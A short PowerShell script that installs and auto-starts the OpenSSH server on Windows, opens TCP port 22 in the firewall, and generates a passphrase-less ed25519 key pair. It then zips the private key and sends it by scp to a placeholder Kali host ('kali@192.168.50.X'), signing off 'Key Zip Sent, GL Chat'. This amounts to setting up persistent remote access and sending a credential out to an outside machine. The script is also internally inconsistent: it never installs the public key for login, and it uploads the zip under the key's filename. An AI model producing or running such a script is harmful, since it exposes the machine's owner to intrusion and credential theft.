# Run in an elevated PowerShell window

$ErrorActionPreference = "Stop"

# Where to save the generated key pair
$KeyDirectory = "C:\SSHKeys"
$KeyName      = "id_ed25519"
$PrivateKey   = Join-Path $KeyDirectory $KeyName
$PublicKey    = "$PrivateKey.pub"

# Ensure folder exists
if (-not (Test-Path $KeyDirectory)) {
    New-Item -ItemType Directory -Path $KeyDirectory -Force | Out-Null
}

Write-Host "Checking OpenSSH Server capability..."
$sshdCapability = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

if (-not $sshdCapability -or $sshdCapability.State -ne 'Installed') {
    Write-Host "Installing OpenSSH Server..."
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
} else {
    Write-Host "OpenSSH Server is already installed."
}

Write-Host "Starting sshd service..."
Start-Service sshd

Write-Host "Setting sshd service to start automatically..."
Set-Service -Name sshd -StartupType Automatic

# Create inbound firewall rule if it does not already exist
$fwRule = Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
if (-not $fwRule) {
    Write-Host "Creating firewall rule for TCP 22..."
    New-NetFirewallRule `
        -Name "OpenSSH-Server-In-TCP" `
        -DisplayName "OpenSSH Server (sshd)" `
        -Enabled True `
        -Direction Inbound `
        -Protocol TCP `
        -Action Allow `
        -LocalPort 22 | Out-Null
} else {
    Write-Host "Firewall rule already exists."
}

# Generate a NEW key pair only if one does not already exist
if (-not (Test-Path $PrivateKey)) {
    Write-Host "Generating new SSH key pair..."
    ssh-keygen -t ed25519 -f $PrivateKey -N '""'
} else {
    Write-Host "Private key already exists at $PrivateKey"
}

$KeyPath = "C:\SSHKeys\id_ed25519"
$ZipPath = "C:\SSHKeys\id_ed25519.zip"

Compress-Archive -Path $KeyPath -DestinationPath $ZipPath -Force

scp C:\SSHKeys\id_ed25519.zip kali@192.168.50.X:/home/kali/.ssh/id_ed25519

Write-Host ""
Write-Host "Done."
Write-Host "Private key saved to: $PrivateKey"
Write-Host "Public key saved to:  $PublicKey"
Write-Host "Key Zip Sent, GL Chat"
Write-Host ""

# Optional, display the public key
Write-Host "Public key contents:"
Get-Content $PublicKey
